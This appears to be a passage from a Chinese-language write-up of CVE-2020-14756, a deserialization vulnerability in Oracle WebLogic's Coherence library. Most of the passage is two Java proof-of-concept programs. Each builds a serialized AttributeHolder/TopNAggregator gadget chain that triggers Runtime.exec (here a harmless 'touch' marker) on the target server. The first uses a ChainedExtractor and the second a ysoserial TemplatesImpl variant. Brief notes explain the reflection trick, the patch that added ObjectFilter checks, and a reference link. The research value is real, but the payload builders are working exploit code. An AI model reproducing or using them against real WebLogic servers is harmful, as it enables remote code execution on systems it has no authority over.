###  12.1.3-ChainedExtractor
    package weblogic.t3;
    import com.tangosol.coherence.reporter.extractor.ConstantExtractor;
    import com.tangosol.coherence.servlet.AttributeHolder;
    import com.tangosol.util.ValueExtractor;
    import com.tangosol.util.aggregator.TopNAggregator;
    import com.tangosol.util.extractor.ChainedExtractor;
    import com.tangosol.util.extractor.ReflectionExtractor;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    public class CVE_2020_14756_1213 {
        public static void main(String[] args) throws Exception{
            ValueExtractor[] fakeaExtractors = new ValueExtractor[]{
                    new ConstantExtractor(null)
            };
            //构造一个假的aExtractors数组，以便于add操作添加整数
            ChainedExtractor extractorChain = new ChainedExtractor(fakeaExtractors);
            TopNAggregator.PartialResult partialResult = new TopNAggregator.PartialResult(extractorChain);
            AttributeHolder attributeHolder = new AttributeHolder();
            Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue",Object.class);
            setInternalValue.setAccessible(true);
            setInternalValue.invoke(attributeHolder,partialResult);
            ValueExtractor[] realaExtractors = new ValueExtractor[]{
                    new ReflectionExtractor("getMethod", new Object[]{"getRuntime", null}),
                    new ReflectionExtractor("invoke", new Object[]{null, null}),
                    new ReflectionExtractor("exec", new Object[]{"touch /tmp/hpdoger"})
            };
            partialResult.add(Runtime.class);
            Field m_aExtractor = extractorChain.getClass().getSuperclass().getDeclaredField("m_aExtractor");
            m_aExtractor.setAccessible(true);
            m_aExtractor.set(extractorChain,realaExtractors);
            FileOutputStream fileOut =
                    new FileOutputStream("/Users/Hpdata/JavaSecurity/POCs/Weblogic/CVE-2020-14756/cve_2020_14756_1213.ser");
            // 建立对象输入流
            ObjectOutputStream out = new ObjectOutputStream(fileOut);
            //输出反序列化对象
            out.writeObject(attributeHolder);
            out.close();
            fileOut.close();
    //        FileInputStream fileIn = new FileInputStream("cve_2020_14756_1213.ser");
    //        ObjectInputStream input = new ObjectInputStream(fileIn);
    //        input.readObject();
        }
    }
在初始化传入了`fakeaExtractors`，防止在`partialResult.add`操作时报错
添加完add之后再调用反射重新对`ChainedExtractor`父类变量`m_aExtractor`赋值
###  12.1.3-TemplatesImpl
    package ysoserial.payloads;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import com.tangosol.coherence.reporter.extractor.ConstantExtractor;
    import com.tangosol.coherence.servlet.AttributeHolder;
    import com.tangosol.util.ValueExtractor;
    import com.tangosol.util.aggregator.TopNAggregator;
    import com.tangosol.util.extractor.ChainedExtractor;
    import com.tangosol.util.extractor.ReflectionExtractor;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    import java.util.HashMap;
    import java.util.HashSet;
    import ysoserial.payloads.util.Reflections;
    import static ysoserial.payloads.util.Gadgets.createTemplatesImpl;
    public class CVE_2020_14756_1213 {
        //还是不能bypass TemplatesImpl这个黑名单
        public static void main(String[] args) throws Exception{
            String cmd = "touch /tmp/hpdoger1213";
            final Object templates = createTemplatesImpl(cmd, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
            ValueExtractor[] fakeaExtractors = new ValueExtractor[]{
                    new ConstantExtractor(null)
            };
            //构造一个假的aExtractors数组，以便于add操作添加整数
            ChainedExtractor extractorChain = new ChainedExtractor(fakeaExtractors);
            TopNAggregator.PartialResult partialResult = new TopNAggregator.PartialResult(extractorChain);
            AttributeHolder attributeHolder = new AttributeHolder();
            Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue",Object.class);
            setInternalValue.setAccessible(true);
            setInternalValue.invoke(attributeHolder,partialResult);
            ValueExtractor[] realaExtractors = new ValueExtractor[]{
                    new ReflectionExtractor("newTransformer")
            };
            partialResult.add(templates);
            Field m_aExtractor = extractorChain.getClass().getSuperclass().getDeclaredField("m_aExtractor");
            m_aExtractor.setAccessible(true);
            m_aExtractor.set(extractorChain,realaExtractors);
            FileOutputStream fileOut =
                    new FileOutputStream("cve_2020_14756_1213.ser");
            // 建立对象输入流
            ObjectOutputStream out = new ObjectOutputStream(fileOut);
            //输出反序列化对象
            out.writeObject(attributeHolder);
            out.close();
            fileOut.close();
        }
    }
PS：学习yso的思路，如果在序列化时为了防止本地反射爆error，则可先调用toString()方法在初始化时伪装，之后再用反射赋值更改要invoke的方法
## 漏洞修补
coherence.jar补丁中，在`readExternalizableLite`方法中对反序列化的数据流调用`ObjectFilter`进行检测
## 参考链接
[安恒研究院](https://mp.weixin.qq.com/s/E-4wjbKD-iSi0CEMegVmZQ)